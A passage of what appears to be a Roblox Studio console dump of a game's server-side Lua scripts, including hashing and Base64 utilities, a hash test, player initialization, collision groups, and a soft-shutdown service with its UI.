	end) .. string.rep("6", block_size - KeyLength)) -- 6 = string.char(0x36)

	local result

	local function partial(message_part)
		if not message_part then
			result = result or hash_func(
				string.gsub(key, ".", function(c)
					return string.char(bit32_bxor(string.byte(c), 0x5c))
				end) .. string.rep("\\", block_size - KeyLength) -- \ = string.char(0x5c)
				.. (string.gsub(append(), "%x%x", HexToBinFunction))
			)

			return result
		elseif result then
			error("Adding more chunks is not allowed after receiving the result", 2)
		else
			append(message_part)
			return partial
		end
	end

	if message then
		-- Actually perform calculations and return the HMAC of a message
		local FinalMessage = partial(message)()
		return AsBinary and (string.gsub(FinalMessage, "%x%x", BinaryStringMap)) or FinalMessage
	else
		-- Return function for chunk-by-chunk loading of a message
		-- User should feed every chunk of the message as single argument to this function and finally get HMAC by invoking this function without an argument
		return partial
	end
end

local sha = {
	md5 = md5,
	sha1 = sha1,
	-- SHA2 hash functions:
	sha224 = function(message)
		return sha256ext(224, message)
	end;

	sha256 = function(message)
		return sha256ext(256, message)
	end;

	sha512_224 = function(message)
		return sha512ext(224, message)
	end;

	sha512_256 = function(message)
		return sha512ext(256, message)
	end;

	sha384 = function(message)
		return sha512ext(384, message)
	end;

	sha512 = function(message)
		return sha512ext(512, message)
	end;

	-- SHA3 hash functions:
	sha3_224 = function(message)
		return keccak((1600 - 2 * 224) / 8, 224 / 8, false, message)
	end;

	sha3_256 = function(message)
		return keccak((1600 - 2 * 256) / 8, 256 / 8, false, message)
	end;

	sha3_384 = function(message)
		return keccak((1600 - 2 * 384) / 8, 384 / 8, false, message)
	end;

	sha3_512 = function(message)
		return keccak((1600 - 2 * 512) / 8, 512 / 8, false, message)
	end;

	shake128 = function(message, digest_size_in_bytes)
		return keccak((1600 - 2 * 128) / 8, digest_size_in_bytes, true, message)
	end;

	shake256 = function(message, digest_size_in_bytes)
		return keccak((1600 - 2 * 256) / 8, digest_size_in_bytes, true, message)
	end;

	-- misc utilities:
	hmac = hmac; -- HMAC(hash_func, key, message) is applicable to any hash function from this module except SHAKE*
	hex_to_bin = hex2bin; -- converts hexadecimal representation to binary string
	base64_to_bin = base642bin; -- converts base64 representation to binary string
	bin_to_base64 = bin2base64; -- converts binary string to base64 representation
	base64_encode = Base64.Encode;
	base64_decode = Base64.Decode;
}

block_size_for_HMAC = {
	[sha.md5] = 64;
	[sha.sha1] = 64;
	[sha.sha224] = 64;
	[sha.sha256] = 64;
	[sha.sha512_224] = 128;
	[sha.sha512_256] = 128;
	[sha.sha384] = 128;
	[sha.sha512] = 128;
	[sha.sha3_224] = (1600 - 2 * 224) / 8;
	[sha.sha3_256] = (1600 - 2 * 256) / 8;
	[sha.sha3_384] = (1600 - 2 * 384) / 8;
	[sha.sha3_512] = (1600 - 2 * 512) / 8;
}

return sha  -  Editar
  04:54:13.783    -  Editar
  04:54:13.783  ----- [2388] ServerScriptService.Scripts.Core.BIG Analytics [Secure].Encryption.Base64 -----  -  Editar
  04:54:13.783  -- @original: https://gist.github.com/Reselim/40d62b17d138cc74335a1b0709e19ce2
local Alphabet = {}
local Indexes = {}

-- A-Z
for Index = 65, 90 do
	table.insert(Alphabet, Index)
end

-- a-z
for Index = 97, 122 do
	table.insert(Alphabet, Index)
end

-- 0-9
for Index = 48, 57 do
	table.insert(Alphabet, Index)
end

table.insert(Alphabet, 43) -- +
table.insert(Alphabet, 47) -- /

for Index, Character in ipairs(Alphabet) do
	Indexes[Character] = Index
end

local Base64 = {}

local bit32_rshift = bit32.rshift
local bit32_lshift = bit32.lshift
local bit32_band = bit32.band

--[[**
	Encodes a string in Base64.
	@param [t:string] Input The input string to encode.
	@returns [t:string] The string encoded in Base64.
**--]]
function Base64.Encode(Input)
	local Output = {}
	local Length = 0

	for Index = 1, #Input, 3 do
		local C1, C2, C3 = string.byte(Input, Index, Index + 2)

		local A = bit32_rshift(C1, 2)
		local B = bit32_lshift(bit32_band(C1, 3), 4) + bit32_rshift(C2 or 0, 4)
		local C = bit32_lshift(bit32_band(C2 or 0, 15), 2) + bit32_rshift(C3 or 0, 6)
		local D = bit32_band(C3 or 0, 63)

		Length = Length + 1
		Output[Length] = Alphabet[A + 1]

		Length = Length + 1
		Output[Length] = Alphabet[B + 1]

		Length = Length + 1
		Output[Length] = C2 and Alphabet[C + 1] or 61

		Length = Length + 1
		Output[Length] = C3 and Alphabet[D + 1] or 61
	end

	local NewOutput = {}
	local NewLength = 0
	local IndexAdd4096Sub1

	for Index = 1, Length, 4096 do
		NewLength = NewLength + 1
		IndexAdd4096Sub1 = Index + 4096 - 1

		NewOutput[NewLength] = string.char(table.unpack(
			Output,
			Index,
			IndexAdd4096Sub1 > Length and Length or IndexAdd4096Sub1
		))
	end

	return table.concat(NewOutput)
end

--[[**
	Decodes a string from Base64.
	@param [t:string] Input The input string to decode.
	@returns [t:string] The newly decoded string.
**--]]
function Base64.Decode(Input)
	local Output = {}
	local Length = 0

	for Index = 1, #Input, 4 do
		local C1, C2, C3, C4 = string.byte(Input, Index, Index + 3)

		local I1 = Indexes[C1] - 1
		local I2 = Indexes[C2] - 1
		local I3 = (Indexes[C3] or 1) - 1
		local I4 = (Indexes[C4] or 1) - 1

		local A = bit32_lshift(I1, 2) + bit32_rshift(I2, 4)
		local B = bit32_lshift(bit32_band(I2, 15), 4) + bit32_rshift(I3, 2)
		local C = bit32_lshift(bit32_band(I3, 3), 6) + I4

		Length = Length + 1
		Output[Length] = A

		if C3 ~= 61 then
			Length = Length + 1
			Output[Length] = B
		end

		if C4 ~= 61 then
			Length = Length + 1
			Output[Length] = C
		end
	end

	local NewOutput = {}
	local NewLength = 0
	local IndexAdd4096Sub1

	for Index = 1, Length, 4096 do
		NewLength = NewLength + 1
		IndexAdd4096Sub1 = Index + 4096 - 1

		NewOutput[NewLength] = string.char(table.unpack(
			Output,
			Index,
			IndexAdd4096Sub1 > Length and Length or IndexAdd4096Sub1
		))
	end

	return table.concat(NewOutput)
end

return Base64  -  Editar
  04:54:13.783    -  Editar
  04:54:13.783  ----- [2389] ServerScriptService.Scripts.Core.BIG Analytics [Secure].Encryption.HashLib.spec -----  -  Editar
  04:54:13.783  local function describe(phrase, callback) end
local function it(phrase, callback) end
local function expect(value) end

return function()
	local HashLib = require(script.Parent)
	local sha256 = HashLib.sha256

	describe("HashLib.sha256", function()
		it("should properly encode strings", function()
			expect(sha256("abc").to.equal("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"))
			expect(sha256("The quick brown fox jumps over the lazy dog").to.equal("d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592"))
			expect(sha256("123456").to.equal("8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"))
		end)

		it("should create a private closure that works", function()
			local AppendNextChunk = sha256()
			AppendNextChunk("The quick brown fox")
			AppendNextChunk(" jumps ")
			AppendNextChunk("") -- chunk may be an empty string
			AppendNextChunk("over the lazy dog")
			expect(AppendNextChunk()).to.equal("d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592")
		end)

		it("should allow the private closure to work if called twice", function()
			local AppendNextChunk = sha256()
			AppendNextChunk("The quick brown fox")
			AppendNextChunk(" jumps ")
			AppendNextChunk("") -- chunk may be an empty string
			AppendNextChunk("over the lazy dog")
			AppendNextChunk()
			expect(AppendNextChunk()).to.equal("d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592")
		end)
	end)
end  -  Editar
  04:54:13.783    -  Editar
  04:54:13.783  ----- [2390] ServerScriptService.Scripts.Core.Player Initialization -----  -  Editar
  04:54:13.783  --------|     Setting     |--------

--------|     Library     |--------

local Bans = require(game.ServerScriptService.Library.Bans)
local Functions = require(game.ReplicatedStorage.Library.Functions)

--------|    Reference    |--------
local remote = workspace:WaitForChild("__THINGS"):WaitForChild("__REMOTES"):WaitForChild("intro")

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

function remote.OnServerInvoke(player)
	local isBanned = Bans.IsBanned(player)
	local isWarned, warnTimer = Bans.IsWarned(player)

	if (not player) then
		return false
	end

	if isBanned or isWarned then
		return true, true, warnTimer
	end

	if player:FindFirstChild("__LOADED") then
		return true
	end

	if player.Character then
		local UpperTorso = player.Character:WaitForChild("UpperTorso", 9999)  
		if UpperTorso then
			UpperTorso.Anchored = false
		end
	end

	local loadedVar = Functions.QuickValue(true,player)
	loadedVar.Name = "__LOADED"
	loadedVar.Parent = player

	return true
end  -  Editar
  04:54:13.783    -  Editar
  04:54:13.783  ----- [2391] ServerScriptService.Scripts.Core.Collision -----  -  Editar
  04:54:13.783  local PhysicsService = game:GetService("PhysicsService")
local Players = game:GetService("Players")

local collisionGroup = "Players"
PhysicsService:CreateCollisionGroup(collisionGroup)
PhysicsService:CollisionGroupSetCollidable(collisionGroup, collisionGroup, false)

local previousCollisionGroups = {}

local function setCollisionGroup(object)
	if object:IsA("BasePart") then
		previousCollisionGroups[object] = object.CollisionGroupId
		PhysicsService:SetPartCollisionGroup(object, collisionGroup)
	end
end

local function setCollisionGroupRecursive(object)
	setCollisionGroup(object)

	for _, child in ipairs(object:GetChildren()) do
		setCollisionGroupRecursive(child)
	end
end

local function resetCollisionGroup(object)
	local previousCollisionGroupId = previousCollisionGroups[object]
	if not previousCollisionGroupId then return end 

	local previousCollisionGroupName = PhysicsService:GetCollisionGroupName(previousCollisionGroupId)
	if not previousCollisionGroupName then return end

	PhysicsService:SetPartCollisionGroup(object, previousCollisionGroupName)
	previousCollisionGroups[object] = nil
end

local function onCharacterAdded(character)
	setCollisionGroupRecursive(character)

	character.DescendantAdded:Connect(setCollisionGroup)
	character.DescendantRemoving:Connect(resetCollisionGroup)
end

local function onPlayerAdded(player)
	player.CharacterAdded:Connect(onCharacterAdded)
end

Players.PlayerAdded:Connect(onPlayerAdded)


PhysicsService = game:GetService('PhysicsService')

PhysicsService:CreateCollisionGroup('Coins')
PhysicsService:CreateCollisionGroup('Orbs')
PhysicsService:CreateCollisionGroup('Lootbags')
PhysicsService:CreateCollisionGroup('Yeet')


PhysicsService:CollisionGroupSetCollidable('Coins', 'Players', true)
PhysicsService:CollisionGroupSetCollidable('Coins', 'Orbs', false)
PhysicsService:CollisionGroupSetCollidable('Coins', 'Lootbags', false)
PhysicsService:CollisionGroupSetCollidable('Coins', 'Yeet', false)

PhysicsService:CollisionGroupSetCollidable('Lootbags', 'Orbs', false)
PhysicsService:CollisionGroupSetCollidable('Lootbags', 'Players', false)
PhysicsService:CollisionGroupSetCollidable('Lootbags', 'Coins', false)
PhysicsService:CollisionGroupSetCollidable('Lootbags', 'Yeet', false)

PhysicsService:CollisionGroupSetCollidable('Orbs', 'Coins', false)
PhysicsService:CollisionGroupSetCollidable('Orbs', 'Lootbags', false)
PhysicsService:CollisionGroupSetCollidable('Orbs', 'Players', false)
PhysicsService:CollisionGroupSetCollidable('Orbs', 'Yeet', false)

PhysicsService:CollisionGroupSetCollidable('Yeet', 'Coins', false)
PhysicsService:CollisionGroupSetCollidable('Yeet', 'Lootbags', false)
PhysicsService:CollisionGroupSetCollidable('Yeet', 'Players', false)  -  Editar
  04:54:13.783    -  Editar
  04:54:13.784  ----- [2392] ServerScriptService.Scripts.Core.SoftShutdown -----  -  Editar
  04:54:13.784  --[[
	This bootstraps both the server and the client code for pretty soft shutdown logic.

	Originally written by Merely, this is Quenty's version of it from here:
	https://github.com/Quenty/NevermoreEngine

	This version supports a nice UI and reserved servers in a normal usage.

	INSTRUCTIONS:
	Insert into ServerScriptService. This script will take care of the rest of it.

	HELP:
	Tweet @quenty on Twitter


	----
	MIT License

	Copyright (c) 2014-2022 Quenty

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
	----

	@class SoftShutdown
]]

local ReplicatedFirst = game:GetService("ReplicatedFirst")

local client, server, shared = require(script:FindFirstChild("LoaderUtils", true)).toWallyFormat(script.src, false)

server.Name = "_SoftShutdownServerPackages"
server.Parent = script

client.Name = "_SoftShutdownClientPackages"
client.Parent = ReplicatedFirst

shared.Name = "_SoftShutdownSharedPackages"
shared.Parent = ReplicatedFirst

local clientScript = script.ClientScript
clientScript.Name = "QuentySoftShutdownClientScript"
clientScript:Clone().Parent = ReplicatedFirst

require(server.SoftShutdownService):Init()  -  Editar
  04:54:13.784    -  Editar
  04:54:13.784  ----- [2393] ServerScriptService.Scripts.Core.SoftShutdown.ClientScript -----  -  Editar
  04:54:13.784  --[[
	@class ClientMain
]]

local ReplicatedFirst = game:GetService("ReplicatedFirst")

local packages = ReplicatedFirst:WaitForChild("_SoftShutdownClientPackages")

local SoftShutdownServiceClient = require(packages.SoftShutdownServiceClient)
local serviceBag = require(packages.ServiceBag).new()

serviceBag:GetService(SoftShutdownServiceClient)

serviceBag:Init()
serviceBag:Start()  -  Editar
  04:54:13.784    -  Editar
  04:54:13.784  ----- [2394] ServerScriptService.Scripts.Core.SoftShutdown.src.Client.SoftShutdownServiceClient -----  -  Editar
  04:54:13.784  --[=[
	@class SoftShutdownServiceClient
]=]

local require = require(script.Parent.loader).load(script)

local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local TeleportService = game:GetService("TeleportService")

local AttributeValue = require("AttributeValue")
local Maid = require("Maid")
local PlayerGuiUtils = require("PlayerGuiUtils")
local Rx = require("Rx")
local SoftShutdownConstants = require("SoftShutdownConstants")
local SoftShutdownTranslator = require("SoftShutdownTranslator")
local SoftShutdownUI = require("SoftShutdownUI")
local RxValueBaseUtils = require("RxValueBaseUtils")

local SoftShutdownServiceClient = {}

local DISABLE_CORE_GUI_TYPES = {
	Enum.CoreGuiType.PlayerList;
	Enum.CoreGuiType.Health;
	Enum.CoreGuiType.Backpack;
	Enum.CoreGuiType.Chat;
	Enum.CoreGuiType.EmotesMenu;
	Enum.CoreGuiType.All;
}

function SoftShutdownServiceClient:Init(serviceBag)
	assert(not self._serviceBag, "Already initialized")
	self._serviceBag = assert(serviceBag, "No serviceBag")

	self._maid = Maid.new()
	self._translator = self._serviceBag:GetService(SoftShutdownTranslator)

	self._isLobby = AttributeValue.new(Workspace, SoftShutdownConstants.IS_SOFT_SHUTDOWN_LOBBY_ATTRIBUTE, false)
	self._isUpdating = AttributeValue.new(Workspace, SoftShutdownConstants.IS_SOFT_SHUTDOWN_UPDATING_ATTRIBUTE, false)

	self._localTeleportDataSaysIsLobby = Instance.new("BoolValue")
	self._localTeleportDataSaysIsLobby.Value = false
	self._maid:GiveTask(self._localTeleportDataSaysIsLobby)

	self._isArrivingAfterShutdown = Instance.new("BoolValue")
	self._isArrivingAfterShutdown.Value = false
	self._maid:GiveTask(self._isArrivingAfterShutdown)

	task.spawn(function()
		if self:_queryLocalTeleportInfo() then
			self._localTeleportDataSaysIsLobby.Value = true
		end
		if self:_queryIsArrivingAfterShutdown() then
			self._isArrivingAfterShutdown.Value = true;
		end
	end)

	self._maid:GiveTask(Rx.combineLatest({
		isLobby = self._isLobby:Observe();
		isShuttingDown = self._isUpdating:Observe();
		localTeleportDataSaysIsLobby = RxValueBaseUtils.observeValue(self._localTeleportDataSaysIsLobby);
		isArrivingAfterShutdown = RxValueBaseUtils.observeValue(self._isArrivingAfterShutdown);
	}):Subscribe(function(state)
		if state.isLobby or state.localTeleportDataSaysIsLobby then
			self._maid._shutdownUI = nil
			if not self._maid._lobbyUI then
				local screenGui
				self._maid._lobbyUI, screenGui = self:_showSoftShutdownUI("shutdown.lobby.title", "shutdown.lobby.subtitle", true)

				TeleportService:SetTeleportGui(screenGui)
			end
		elseif state.isShuttingDown then
			local screenGui
			self._maid._shutdownUI, screenGui = self:_showSoftShutdownUI("shutdown.restart.title", "shutdown.restart.subtitle")

			TeleportService:SetTeleportGui(screenGui)

			self._maid._lobbyUI = nil
		elseif state.isArrivingAfterShutdown then
			-- Construct
			local maid = self:_showSoftShutdownUI("shutdown.complete.title", "shutdown.complete.subtitle", true)
			self._maid._shutdownUI = maid
			self._maid._lobbyUI = nil

			-- Defer
			task.delay(1, function()
				if self._maid._shutdownUI == maid then
					self._maid._shutdownUI = nil
				end
			end)
		else
			self._maid._shutdownUI = nil
			self._maid._lobbyUI = nil
		end
	end))
end

function SoftShutdownServiceClient:_queryIsArrivingAfterShutdown()
	local data = TeleportService:GetLocalPlayerTeleportData()
	if type(data) == "table" and data.isSoftShutdownArrivingIntoUpdatedServer then
		return true
	else
		return false
	end
end

function SoftShutdownServiceClient:_queryLocalTeleportInfo()
	local data = TeleportService:GetLocalPlayerTeleportData()
	if type(data) == "table" and data.isSoftShutdownReserveServer then
		return true
	else
		return false
	end
end

function SoftShutdownServiceClient:_showSoftShutdownUI(titleKey, subtitleKey, doNotAnimateShow)
	local maid = Maid.new()

	local renderMaid = Maid.new()

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "SoftShutdownScreenGui"
	screenGui.ResetOnSpawn = false
	screenGui.AutoLocalize = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 1e10
	screenGui.Parent = PlayerGuiUtils.getPlayerGui()
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	renderMaid:GiveTask(screenGui)

	local softShutdownUI = SoftShutdownUI.new()
	renderMaid:GiveTask(softShutdownUI)

	maid:GiveTask(function()
		softShutdownUI:Hide()

		task.delay(1, function()
			renderMaid:Destroy()
		end)
	end)

	self:_hideCoreGuiUI(renderMaid, screenGui)

	maid:GivePromise(self._translator:PromiseFormatByKey(subtitleKey)):Then(function(subtitle)
		softShutdownUI:SetSubtitle(subtitle)
	end)

	maid:GivePromise(self._translator:PromiseFormatByKey(titleKey)):Then(function(title)
		softShutdownUI:SetTitle(title)
	end)

	softShutdownUI:Show(doNotAnimateShow)

	softShutdownUI.Gui.Parent = screenGui

	return maid, screenGui
end

function SoftShutdownServiceClient:_hideCoreGuiUI(maid, ignoreScreenGui)
	-- Hide all other ui
	if not UserInputService.ModalEnabled then
		UserInputService.ModalEnabled = true
		maid:GiveTask(function()
			UserInputService.ModalEnabled = false
		end)
	end

	local playerGui = PlayerGuiUtils.getPlayerGui()

	local enabledScreenGuis = {}

	local function handleChild(child)
		if child:IsA("ScreenGui") and child ~= ignoreScreenGui and child.Enabled then
			enabledScreenGuis[child] = child
			child.Enabled = false
		end
	end

	for _, child in pairs(playerGui:GetChildren()) do
		handleChild(child)
	end

	maid:GiveTask(playerGui.ChildAdded:Connect(function(child)
		handleChild(child)
	end))

	maid:GiveTask(playerGui.ChildRemoved:Connect(function(child)
		enabledScreenGuis[child] = nil
	end))

	maid:GiveTask(function()
		for screenGui, _ in pairs(enabledScreenGuis) do
			screenGui.Enabled = true
		end
	end)

	for _, coreGuiType in pairs(DISABLE_CORE_GUI_TYPES) do
		task.spawn(function()
			if StarterGui:GetCoreGuiEnabled(coreGuiType) then
				StarterGui:SetCoreGuiEnabled(coreGuiType, false)

				maid:GiveTask(function()
					StarterGui:SetCoreGuiEnabled(coreGuiType, true)
				end)
			end
		end)
	end
end

function SoftShutdownServiceClient:Destroy()
	self._maid:DoCleaning()
end

return SoftShutdownServiceClient  -  Editar
  04:54:13.784    -  Editar
  04:54:13.784  ----- [2395] ServerScriptService.Scripts.Core.SoftShutdown.src.Client.SoftShutdownTranslator -----  -  Editar
  04:54:13.784  --[[
	@class SoftShutdownTranslator
]]

local require = require(script.Parent.loader).load(script)

return require("JSONTranslator").new("en", {
	shutdown = {
		lobby = {
			title = "Rebooting servers for update.";
			subtitle = "Teleporting back in a moment...";
		};
		restart = {
			title = "Rebooting servers for update.";
			subtitle = "Please wait...";
		};
		complete = {
			title = "Rebooting servers for update.";
			subtitle = "Update complete...";
		};
	};
})  -  Editar
  04:54:13.784    -  Editar
  04:54:13.784  ----- [2396] ServerScriptService.Scripts.Core.SoftShutdown.src.Client.SoftShutdownUI -----  -  Editar
  04:54:13.784  --[=[
	@class SoftShutdownUI
]=]

local require = require(script.Parent.loader).load(script)

local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local BasicPane = require("BasicPane")
local Blend = require("Blend")
local SpringObject = require("SpringObject")
local Rx = require("Rx")
local Math = require("Math")

local SoftShutdownUI = setmetatable({}, BasicPane)
SoftShutdownUI.ClassName = "SoftShutdownUI"
SoftShutdownUI.__index = SoftShutdownUI

function SoftShutdownUI.new()
	local self = setmetatable(BasicPane.new(), SoftShutdownUI)

	self._title = Instance.new("StringValue")
	self._title.Value = ""
	self._maid:GiveTask(self._title)

	self._subtitle = Instance.new("StringValue")
	self._subtitle.Value = ""
	self._maid:GiveTask(self._subtitle)

	self._percentVisible = SpringObject.new(0, 40)
	self._maid:GiveTask(self._percentVisible)

	self._maid:GiveTask(self.VisibleChanged:Connect(function(isVisible, doNotAnimate)
		self._percentVisible.t = isVisible and 1 or 0
		if doNotAnimate then
			self._percentVisible.p = self._percentVisible.t
			self._percentVisible.v = 0
		end
	end))

	self._blur = Instance.new("BlurEffect")
	self._blur.Name = "SoftShutdownBlur"
	self._blur.Enabled = false
	self._blur.Size = 0
	self._blur.Parent = Workspace.CurrentCamera
	self._maid:GiveTask(self._blur)

	self._maid:GiveTask(self:_render():Subscribe(function(gui)
		self.Gui = gui
	end))

	return self
end

function SoftShutdownUI:SetTitle(text)
	self._title.Value = text
end

function SoftShutdownUI:SetSubtitle(text)
	self._subtitle.Value = text
end

function SoftShutdownUI:_render()
	local percentVisible = self._percentVisible:ObserveRenderStepped()
	local transparency = Blend.Computed(percentVisible, function(value)
		return 1 - value
	end)
	local backgroundColor = Color3.new(0, 0, 0)
	local foregroundColor = Color3.new(0.9, 0.9, 0.9)

	self._maid:GiveTask(percentVisible:Subscribe(function(percent)
		self._blur.Size = percent*30
		self._blur.Enabled = percent > 0
	end))

	return Blend.New "Frame" {
		Name = "SoftShutdownUI";
		Size = UDim2.new(1, 0, 1, 0);
		AnchorPoint = Vector2.new(0.5, 0.5);
		Position = UDim2.fromScale(0.5, 0.5);
		Active = Blend.Computed(percentVisible, function(visible)
			return visible > 0
		end);
		Visible = Blend.Computed(percentVisible, function(visible)
			return visible > 0
		end);
		BackgroundColor3 = backgroundColor;
		BackgroundTransparency = Blend.Computed(percentVisible, function(visible)
			return Math.map(visible, 0, 1, 1, 0.4)
		end);

		[Blend.Children] = {
			Blend.New "UIPadding" {
				PaddingLeft = UDim.new(0, 20);
				PaddingRight = UDim.new(0, 20);
				PaddingTop = UDim.new(0, 20);
				PaddingBottom = UDim.new(0, 20);
			};

			Blend.New "Frame" {
				Name = "ContentContainer";
				Size = UDim2.new(1, 0, 1, 0);
				AnchorPoint = Vector2.new(0.5, 0.5);
				Position = UDim2.fromScale(0.5, 0.5);
				BackgroundTransparency = 1;

				[Blend.Children] = {
					Blend.New "UIScale" {
						Scale = Blend.Computed(percentVisible, function(visible)
							return 0.7 + 0.3*visible
						end);
					};

					Blend.New "Frame" {
						Name = "ImageLabelContainer";
						Size = UDim2.new(0, 80, 0, 80);
						BackgroundTransparency = 1;
						LayoutOrder = 1;

						[Blend.Children] = {
							Blend.New "ImageLabel" {
								Size = UDim2.new(1, 0, 1, 0);
								ImageTransparency = transparency;
								BackgroundTransparency = 1;
								Image = "rbxassetid://6031302916";
							};
						};
					};

					Blend.New "Frame" {
						Name = "LabelContainer";
						Size = UDim2.new(1, 0, 0, 80);
						Position = UDim2.new(0.5, 0, 0.5,0);
						AnchorPoint = Vector2.new(0.5, 0.5);
						BackgroundTransparency = 1;
						LayoutOrder = 2;

						[Blend.Children] = {
							Blend.New "TextLabel" {
								Name = "TitleLabel";
								BackgroundTransparency = 1;
								Position = UDim2.fromScale(0.5, 0);
								Size = UDim2.new(1, 0, 0.6, 0);
								AnchorPoint = Vector2.new(0.5, 0);
								Text = self._title;
								Font = Enum.Font.SourceSansBold;
								TextTransparency = transparency;
								TextColor3 = foregroundColor;
								LayoutOrder = 1;
								TextScaled = true;
							};

							Blend.New "TextLabel" {
								Name = "SubtitleLabel";
								BackgroundTransparency = 1;
								Position = UDim2.fromScale(0.5, 1);
								Size = UDim2.new(1, 0, 0.3, 0);
								AnchorPoint = Vector2.new(0.5, 1);
								Text = self._subtitle;
								Font = Enum.Font.SourceSansLight;
								TextTransparency = transparency;
								TextColor3 = foregroundColor;
								LayoutOrder = 2;
								TextScaled = true;
							};

							Blend.New "UIAspectRatioConstraint" {
								AspectRatio = 5;
							};
						};
					};

					Blend.New "Frame" {
						Name = "Spacer";
						BackgroundTransparency = 1;
						Size = UDim2.new(0, 0, 0, 50);
						LayoutOrder = 3;
					};

					Blend.New "Frame" {
						Name = "LoadingLabel";
						Position = UDim2.fromScale(0.5, 0.5);
						AnchorPoint = Vector2.new(0.5, 0.5);
						LayoutOrder = 4;
						Size = UDim2.fromScale(0.25, 0.25);
						BackgroundTransparency = 1;

						[Blend.Children] = {
							Blend.New "Frame" {
								Name = "RobloxLogo";
								Size = UDim2.new(1, 0, 1, 0);
								BackgroundColor3 = foregroundColor;
								AnchorPoint = Vector2.new(0.5, 0.5);
								Position = UDim2.fromScale(0.5, 0.5);

								BackgroundTransparency = transparency;
								Rotation = Rx.fromSignal(RunService.RenderStepped):Pipe({
									Rx.map(function()
										-- tick persists between sessions
										local t = tick()*math.pi*1.5
										local smallerWave = math.sin(t)
										local percent = (math.sin(t - math.pi/2) + 1)/2

										if smallerWave > 0 then
											return 15 + percent*360
										else
											return 15
										end
									end);
								});

								[Blend.Children] = {
									Blend.New "Frame" {
										BackgroundColor3 = backgroundColor;
										Size = UDim2.fromScale(1/5, 1/5);
										AnchorPoint = Vector2.new(0.5, 0.5);
										Position = UDim2.fromScale(0.5, 0.5);
										BackgroundTransparency = transparency;
									};
								}
							};

							Blend.New "UIAspectRatioConstraint" {
								AspectRatio = 1;
							};

							Blend.New "UISizeConstraint" {
								MaxSize = Vector2.new(math.huge, 50);
							};
						};
					};

					Blend.New "UIListLayout" {
						FillDirection = Enum.FillDirection.Vertical;
						SortOrder = Enum.SortOrder.LayoutOrder;
						HorizontalAlignment = Enum.HorizontalAlignment.Center;
						VerticalAlignment = Enum.VerticalAlignment.Center;
						Padding = UDim.new(0, 10);
					};
				};
			};
		};
	}
end

return SoftShutdownUI  -  Editar
  04:54:13.784    -  Editar
  04:54:13.784  ----- [2397] ServerScriptService.Scripts.Core.SoftShutdown.src.Client.SoftShutdownUI.story -----  -  Editar
  04:54:13.785  --[[
	@class SoftShutdownUI.story
]]

local require = require(game:GetService("ServerScriptService"):FindFirstChild("LoaderUtils", true).Parent).load(script)

local Maid = require("Maid")
local SoftShutdownTranslator = require("SoftShutdownTranslator")
local SoftShutdownUI = require("SoftShutdownUI")
local ServiceBag = require("ServiceBag")

return function(target)
	local maid = Maid.new()
	local serviceBag = ServiceBag.new()
	maid:GiveTask(serviceBag)

	local translator = serviceBag:GetService(SoftShutdownTranslator)

	local softShutdownUI = SoftShutdownUI.new()
	maid:GiveTask(softShutdownUI)

	maid:GivePromise(translator:PromiseFormatByKey("shutdown.lobby.title")):Then(function(text)
		softShutdownUI:SetTitle(text)
	end)

	maid:GivePromise(translator:PromiseFormatByKey("shutdown.lobby.subtitle")):Then(function(text)
		softShutdownUI:SetSubtitle(text)
	end)

	softShutdownUI:Show()

	softShutdownUI.Gui.Parent = target

	return function()
		maid:DoCleaning()
	end
end  -  Editar
  04:54:13.785    -  Editar
  04:54:13.785  ----- [2398] ServerScriptService.Scripts.Core.SoftShutdown.src.Server.SoftShutdownService -----  -  Editar
  04:54:13.785  --[=[
	This service lets you shut down servers without losing a bunch of players.
	When game.OnClose is called, the script teleports everyone in the server
	into a reserved server.

	When the reserved servers start up, they wait a few seconds, and then
	send everyone back into the main place.

	Originally written by Merely
	https://github.com/MerelyRBLX/ROBLOX-Lua/blob/master/SoftShutdown.lua

	Modified by Quenty

	@class SoftShutdownService
]=]

local require = require(script.Parent.loader).load(script)

local DataStoreService = game:GetService("DataStoreService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local DataStorePromises = require("DataStorePromises")
local Maid = require("Maid")
local Promise = require("Promise")
local SoftShutdownConstants = require("SoftShutdownConstants")
local TeleportServiceUtils = require("TeleportServiceUtils")

local SoftShutdownService = {}

function SoftShutdownService:Init()
	self._dataStore = DataStoreService:GetDataStore("IsSoftShutdownServer")
	self._maid = Maid.new()

	self:_promiseIsLobby():Then(function(isLobby)
		if isLobby then
			self:_promiseRedirectAllPlayers()
		else
			game:BindToClose(function()
				local promise = self:_promiseTeleportPlayersToLobby()
				promise:Wait()
			end)
		end
	end)
end

function SoftShutdownService:_isReservedServer()
	return game.PrivateServerId ~= "" and game.PrivateServerOwnerId == 0
end

function SoftShutdownService:_promiseIsLobby()
	if not self:_isReservedServer() then
